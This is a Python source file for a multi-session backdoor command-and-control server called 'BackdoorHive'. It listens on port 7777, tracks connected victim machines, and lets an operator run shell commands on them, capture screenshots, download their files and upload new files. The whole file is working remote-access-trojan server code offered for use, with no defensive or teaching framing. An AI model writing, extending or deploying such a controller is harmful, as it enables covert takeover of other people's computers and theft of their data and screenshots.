#!/usr/bin/python

import socket
import json
import os
import base64
import threading


def shell(target, ip):
    def send_j(data):
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))

    def recv_j():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode('utf-8')  # receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data)
            except ValueError:  # if the output of json.loads(data) is not complete (not in json format)
                continue

    #outside of while loop we can set up an input for sessions and client management
    #and only the client connected will enter the loop and when exit we come back to choosing clients
    while True:
        cmd =  input("# ")
        send_j(cmd) # send command to client
        if cmd == "background":
            break
        elif cmd == "kill_client":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif cmd[:2] == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
            continue
        elif cmd[:10] == "screenshot":
            with open("screenshot_client","wb") as f:
                data = recv_j()
                print(data)
                f.write(base64.b64decode(data))
                f.close()
            continue
        elif cmd[:8] == "download":
            with open(cmd[9:],"wb") as f:
                data = recv_j()
                f.write(base64.b64decode(data)) #receive content of file from client and write into a speified file name
                f.close()
            continue
        elif cmd[:6] == "upload":
            try:
                with open(cmd[7:], "rb") as f:
                    send_j(base64.b64encode(f.read()).decode('utf-8')) #send the content of the file in the server
                    f.close()
                continue
            except:
                error = "failed to upload"
                send_j(base64.b64encode(error.encode('utf-8')).decode('utf-8'))
                #continue
        output = recv_j() #receive output from client
        print(output)

def server():
    global client_index
    while True:
        if stop_threads:
            break
        s.settimeout(1) #
        try:
            target, ip = s.accept() #accepting an incoming connection (target is socket object and IP is remote IP+port)
            targets.append(target)
            ips.append(ip)
            print(str(targets[client_index]) + "---" + str(ips[client_index]) + "CONNECTED")
            client_index += 1
            continue
        except:
            pass



 #count of connections
global s
ips = [] #list of IP,port
targets = [] #lisk of socket objects
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 7777))
s.listen(5)
print("Listening to incoming connections")
client_index = 0

stop_threads = False
thread1 = threading.Thread(target=server) #setting a thread to run function server()
thread1.start()

# C2 center
while True:
    cmd = input("BackdoorHive > ")
    #exit C2 center
    if cmd[:4] == "exit":
        stop_threads = True #stop thread1
        break # exit current while loop
    elif cmd == "sessions":
        count = 0
        for ip in ips:
            print(f"Session {count} ----- {ip}")
            count += 1
    #kill session <id>
    elif cmd[:4] == "kill":
        try:
            session_id = int(cmd[5:])
            targets[session_id].close()
            targets.pop(session_id) #only remove session from list (connection still alive)
            ips.pop(session_id)
            #need to implement how to terminate session
        except:
            print ("No session to close")
    #interact with a specific target
    elif cmd[:7] == "session":
        try:
            session_id = int(cmd[8:])
            target = targets[session_id]
            ip = ips[session_id]

        except:
            print("Session not found")
        else:
            shell(target, ip)